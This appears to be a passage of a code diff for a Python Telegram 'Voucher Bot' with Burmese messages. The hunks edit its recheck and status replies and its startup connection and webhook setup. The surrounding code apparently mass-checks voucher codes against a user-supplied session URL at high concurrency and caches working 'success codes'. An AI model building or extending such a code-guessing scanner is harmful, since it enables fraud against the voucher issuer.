     cid = message.chat.id
     if cid not in user_data or "session_url" not in user_data[cid]:
-        await bot.reply_to(message, "❌ /setup ဖြင့် URL ထည့်ပါ")
+        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
         return
     success = success_texts.get(cid, [])
     if not success:
-        await bot.reply_to(message, "⚠️ Recheck လုပ်ရန် success code မရှိပါ")
+        await bot.reply_to(message, "⚠️ Recheck လုပ်ရန် success code မရှိပါ။")
         return
-    await bot.reply_to(message, "⏳ ပြန်စစ်နေသည်...")
+
+    await bot.reply_to(message, "⏳ Success codes ပြန်စစ်ဆေးနေပါသည်...")
     new_success = []
     for item in success:
         recode = await perform_check(
@@ -1232,26 +1208,25 @@ async def cmd_recheck(message):
         lines = [f"`{it['code']}` – ⏳ {it.get('plan','N/A')}" for it in new_success]
         await send_chunks(cid, f"✅ Recheck ({len(new_success)}):\n" + "\n".join(lines))
     else:
-        await bot.reply_to(message, "Recheck ပြီး success တစ်ခုမျှ မကျန်")
+        await bot.reply_to(message, "Recheck ပြီး success code တစ်ခုမျှ မကျန်ပါ။")
 
 
 @bot.message_handler(commands=["status"])
 async def cmd_status(message):
     if not is_admin(message.chat.id):
+        await bot.reply_to(message, "❌ No Permission")
         return
     active = sum(1 for d in scan_tasks.values() if not d["task"].done())
     up = int(time.monotonic() - START_TS)
     h, r = divmod(up, 3600)
     m, s = divmod(r, 60)
-    pool_sizes = {str(k): v.qsize() for k, v in session_pools.items() if not v.empty()}
     await bot.reply_to(
         message,
         f"📊 Bot Status\n"
         f"⏱ Uptime: {h}h {m}m {s}s\n"
         f"🔍 Active scans: {active}\n"
-        f"👥 Sessions: {len(user_data)}\n"
+        f"👥 Sessions loaded: {len(user_data)}\n"
         f"💎 Codes cached: {sum(len(v) for v in success_texts.values())}\n"
-        f"🔋 Pools: {pool_sizes or '—'}\n"
         f"🐙 GitHub: {'ON' if GITHUB_ON else 'OFF'}",
     )
 
@@ -1274,34 +1249,22 @@ async def start_polling():
 async def main():
     global session, _connector, _voucher_sem
 
-    # ⚠️ force_close=True မထည့်ပါနဲ့ — performance ကို ဖျက်တယ်
-    _connector = aiohttp.TCPConnector(
-        limit=CONCURRENCY + 50,
-        ttl_dns_cache=300,
-        enable_cleanup_closed=True,
-    )
+    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300)
     session = aiohttp.ClientSession(
         timeout=aiohttp.ClientTimeout(total=30),
         connector=_connector, connector_owner=False,
     )
     _voucher_sem = asyncio.Semaphore(CONCURRENCY)
 
-    logger.info("🚀 Voucher Bot starting… (concurrency=%d, batch=%d)",
-                CONCURRENCY, BATCH_SIZE)
-
-    # Pre-load OCR
+    logger.info("🚀 Voucher Bot starting…")
     try:
-        _get_ocr()
-        logger.info("✅ OCR Engine ready")
-    except Exception as e:
-        logger.error("❌ OCR pre-load failed: %s", e)
-
-    try:
+        # ── CRITICAL: drop any stale webhook before polling ────────────
+        # Prevents: 409 Conflict "can't use getUpdates while webhook is active"
         try:
             await bot.delete_webhook(drop_pending_updates=True)
-            logger.info("🧹 Webhook cleared")
+            logger.info("🧹 Webhook cleared (pending updates dropped)")
         except Exception as e:
-            logger.warning("delete_webhook: %s", e)
+            logger.warning("delete_webhook failed: %s", e)
 
         asyncio.create_task(web_server())
         asyncio.create_task(github_writer_loop())
@@ -1309,9 +1272,6 @@ async def main():
         await load_saved_results()
         await start_polling()
     finally:
-        # Stop all pools
-        for cid in list(pool_fillers.keys()):
-            _stop_pool(cid)
         await session.close()
         await _connector.close()
 
